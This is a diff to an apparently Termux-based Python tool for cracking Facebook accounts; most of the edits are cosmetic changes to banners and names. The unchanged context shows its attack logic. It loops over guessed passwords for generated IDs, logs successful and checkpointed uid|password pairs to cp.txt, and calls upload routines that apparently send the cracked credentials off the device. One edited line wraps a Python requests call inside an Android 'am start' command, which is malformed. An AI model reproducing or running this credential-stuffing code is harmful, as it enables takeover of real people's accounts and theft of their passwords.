@@ -41,8 +41,8 @@ def runtxt(z):
 
 def helpnote():
 	print("%s [*] FOLLOW ME ON Fb TU KNOW ABOUT UPDATES  :)"%(G))
-	subprocess.check_output(["am", "start", "plr = requests.get('https://github.com/TBBCYBERZONE/TBB_CONTROL_ROOM/blob/main/Aprov.txt"]).text
-	exit(" [*] FACEBOOK : MD TUSHAR SARKER ")
+	subprocess.check_output(["am", "start", "plr = requests.get('https://github.com/TBBCYBERZONE/TBB_CONTROL_ROOM/blob/main/Aprov.txt').text"])
+	exit(" [*] FACEBOOK :  Md Tushar Sarker ")
 
 
 def notice():
@@ -51,7 +51,7 @@ def notice():
 
 	runtxt("\n\033[0;91mYOU ARE NOT PREMIUM USER ")
 	runtxt("\033[0;93m  SENT THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
-	runtxt("\033[0;92m ADMIN MESSENGER🔰TUSHAR")
+	runtxt("\033[0;92m ADMIN MESSENGER🔰Tushar")
 	subprocess.check_output(["am", "start", "https://m.me/rafi.sarker.9085"])
 
 def irfan():
@@ -98,16 +98,18 @@ class Main:
 		
 		print ("""\033[1;92m   
 
-████████╗██╗   ██╗███████╗██╗  ██╗ █████╗ ██████╗ 
-╚══██╔══╝██║   ██║██╔════╝██║  ██║██╔══██╗██╔══██╗
-   ██║   ██║   ██║███████╗███████║███████║██████╔╝
-   ██║   ██║   ██║╚════██║██╔══██║██╔══██║██╔══██╗
-   ██║   ╚██████╔╝███████║██║  ██║██║  ██║██║  ██║
-   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                                                                                                                                  
+ooooooooooooo                      oooo                                
+8'   888   `8                      `888                                
+     888      oooo  oooo   .oooo.o  888 .oo.    .oooo.   oooo d8b      
+     888      `888  `888  d88(  "8  888P"Y88b  `P  )88b  `888""8P      
+     888       888   888  `"Y88b.   888   888   .oP"888   888          
+     888       888   888  o.  )88b  888   888  d8(  888   888          
+    o888o      `V88V"V8P' 8""888P' o888o o888o `Y888""8o d888b         
+                                                                                                                                                                                                                                                                                                                 
 \033[1;90m══════════════════════════════════════════════════
 \033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Md Tushar Sarker 
-\033[1;91m [\033[1;94m✓\033[1;91m] \033]1;92mYOUTUBE : Hacking Bangla Tushar official 
-\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : TBBCYBERZONE 
+\033[1;91m [\033[1;94m✓\033[1;91m]
+\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : A TBBCYBERZONE
 \033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01863736449
 \033[1;90m══════════════════════════════════════════════════
     """)
@@ -398,7 +400,7 @@ class Main:
 	def email(self):
 		x = 111
 		xx = 999
-		nam = input("%s [?] TYPE A NAME %s(EX: Tushar): "%(Y,G))
+		nam = input("%s [?] TYPE A NAME %s(EX: TUSHAR): "%(Y,G))
 		nam = nam.replace(" ", "")
 		print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G))
 		idx = input("%s DOMAIN  : "%(B))
@@ -437,7 +439,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]"
 		])
 		sys.stdout.write(
-			"\r\r %s[>_] [TBBCYBER_OLD] : %s/%s -> \033[0;92m [ TBBCYBER-OK:%s ]- \033[0;91m[R4H4D-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r\r %s[>_] [TUSHAR_OLD] : %s/%s -> \033[0;92m [ TUSHAR-OK:%s ]- \033[0;91m[R4H4D-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -460,9 +462,9 @@ class Main:
 				uploadoks()
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;91m[TUSHAR-CP] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;91m[RAFI-CP] %s|%s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("cp.txt","a").write(" [TUSHAR-CP] %s|%s\n"%(uid, pw))
+				open("cp.txt","a").write(" [RAFI-CP] %s|%s\n"%(uid, pw))
 				uploadcps()
 				break
 			else:
